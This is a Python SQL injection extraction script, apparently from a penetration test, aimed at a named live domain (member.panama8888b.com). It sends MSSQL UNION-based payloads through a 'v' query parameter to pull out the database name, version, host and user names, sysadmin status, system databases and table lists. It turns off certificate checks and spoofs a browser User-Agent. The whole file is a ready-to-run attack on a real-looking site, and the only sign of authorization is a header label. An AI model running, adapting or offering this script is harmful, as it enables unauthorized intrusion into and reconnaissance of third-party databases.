#!/usr/bin/env python3

"""
Database Information Extraction Script
Extract real database information to confirm SQL injection vulnerability
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class DatabaseExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.database_info = {}
        
    def extract_info(self, payload, description):
        """Extract information using SQL injection"""
        print(f"[*] Extracting: {description}")
        
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            response = self.session.get(url, timeout=15)
            
            # Extract information from response
            content = response.text.lower()
            
            # Look for database information patterns
            patterns = {
                'database_name': r'db_name\(\)[^>]*>([^<]+)',
                'database_version': r'@@version[^>]*>([^<]+)',
                'server_name': r'@@servername[^>]*>([^<]+)',
                'current_user': r'user_name\(\)[^>]*>([^<]+)',
                'table_name': r'from\s+([a-zA-Z_][a-zA-Z0-9_]*)',
                'column_name': r'select\s+([a-zA-Z_][a-zA-Z0-9_]*)',
                'error_info': r'(microsoft|sql server|database|table|column)',
                'version_info': r'(microsoft sql server|mssql|sql server)\s+([0-9.]+)',
            }
            
            extracted_data = {}
            
            for key, pattern in patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    extracted_data[key] = matches
            
            # Also check for specific SQL error messages that might contain info
            sql_errors = [
                'microsoft sql server',
                'database',
                'table',
                'column',
                'sysobjects',
                'information_schema',
                'master',
                'tempdb',
                'model',
                'msdb'
            ]
            
            for error in sql_errors:
                if error in content:
                    if 'sql_errors' not in extracted_data:
                        extracted_data['sql_errors'] = []
                    extracted_data['sql_errors'].append(error)
            
            return extracted_data
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return {}
    
    def extract_database_name(self):
        """Extract database name"""
        payloads = [
            ("25.1)) UNION SELECT DB_NAME() --", "Database Name"),
            ("25.1)) UNION SELECT DB_NAME(0) --", "Database Name (0)"),
            ("25.1)) UNION SELECT DB_NAME(1) --", "Database Name (1)"),
            ("25.1)) AND (SELECT DB_NAME()) IS NOT NULL --", "Database Name Check"),
        ]
        
        for payload, description in payloads:
            result = self.extract_info(payload, description)
            if result:
                self.database_info['database_name'] = result
                return result
        return {}
    
    def extract_version_info(self):
        """Extract version information"""
        payloads = [
            ("25.1)) UNION SELECT @@version --", "Version Info"),
            ("25.1)) UNION SELECT @@servername --", "Server Name"),
            ("25.1)) UNION SELECT SERVERPROPERTY('ProductVersion') --", "Product Version"),
            ("25.1)) UNION SELECT SERVERPROPERTY('Edition') --", "Edition"),
        ]
        
        for payload, description in payloads:
            result = self.extract_info(payload, description)
            if result:
                self.database_info['version_info'] = result
                return result
        return {}
    
    def extract_tables(self):
        """Extract table names"""
        payloads = [
            ("25.1)) UNION SELECT name FROM sysobjects WHERE xtype='U' --", "User Tables"),
            ("25.1)) UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --", "All Tables"),
            ("25.1)) UNION SELECT name FROM sysobjects WHERE type='U' --", "User Tables (type)"),
            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 --", "Table Count"),
        ]
        
        for payload, description in payloads:
            result = self.extract_info(payload, description)
            if result:
                self.database_info['tables'] = result
                return result
        return {}
    
    def extract_environment_info(self):
        """Extract environment information"""
        payloads = [
            ("25.1)) UNION SELECT @@servername --", "Server Name"),
            ("25.1)) UNION SELECT HOST_NAME() --", "Host Name"),
            ("25.1)) UNION SELECT SYSTEM_USER --", "System User"),
            ("25.1)) UNION SELECT USER_NAME() --", "Current User"),
            ("25.1)) UNION SELECT IS_SRVROLEMEMBER('sysadmin') --", "Is Sysadmin"),
        ]
        
        for payload, description in payloads:
            result = self.extract_info(payload, description)
            if result:
                self.database_info['environment'] = result
                return result
        return {}
    
    def extract_system_databases(self):
        """Extract system database information"""
        payloads = [
            ("25.1)) UNION SELECT name FROM master..sysdatabases --", "System Databases"),
            ("25.1)) AND (SELECT COUNT(*) FROM master..sysdatabases)>0 --", "Database Count"),
            ("25.1)) UNION SELECT DB_NAME(0) UNION SELECT DB_NAME(1) UNION SELECT DB_NAME(2) --", "Multiple Databases"),
        ]
        
        for payload, description in payloads:
            result = self.extract_info(payload, description)
            if result:
                self.database_info['system_databases'] = result
                return result
        return {}
    
    def run_extraction(self):
        """Run complete database extraction"""
        print("="*60)
        print("Database Information Extraction")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*60)
        
        print("\n[*] Starting database extraction...")
        
        # Extract database name
        print("\n[1] Extracting database name...")
        db_name = self.extract_database_name()
        if db_name:
            print(f"[+] Database name extracted: {db_name}")
        
        # Extract version info
        print("\n[2] Extracting version information...")
        version_info = self.extract_version_info()
        if version_info:
            print(f"[+] Version info extracted: {version_info}")
        
        # Extract environment info
        print("\n[3] Extracting environment information...")
        env_info = self.extract_environment_info()
        if env_info:
            print(f"[+] Environment info extracted: {env_info}")
        
        # Extract system databases
        print("\n[4] Extracting system databases...")
        sys_db = self.extract_system_databases()
        if sys_db:
            print(f"[+] System databases extracted: {sys_db}")
        
        # Extract tables
        print("\n[5] Extracting table names...")
        tables = self.extract_tables()
        if tables:
            print(f"[+] Tables extracted: {tables}")
        
        # Summary
        print("\n" + "="*60)
        print("EXTRACTION SUMMARY")
        print("="*60)
        
        if self.database_info:
            print("\n[+] DATABASE INFORMATION EXTRACTED:")
            for key, value in self.database_info.items():
                print(f"  {key}: {value}")
        else:
            print("\n[!] No database information could be extracted")
            print("[!] Target might be protected or not vulnerable")
        
        return self.database_info
    
    def save_results(self, filename="database_extraction_results.json"):
        """Save extraction results"""
        with open(filename, 'w') as f:
            json.dump(self.database_info, f, indent=2)
        print(f"\n[+] Results saved to: {filename}")

def main():
    try:
        extractor = DatabaseExtractor()
        results = extractor.run_extraction()
        extractor.save_results()
        
        if results:
            print("\n[+] Database extraction completed successfully!")
            print("[+] SQL injection vulnerability confirmed!")
        else:
            print("\n[!] No database information extracted")
            print("[!] Target might be secure or protected")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()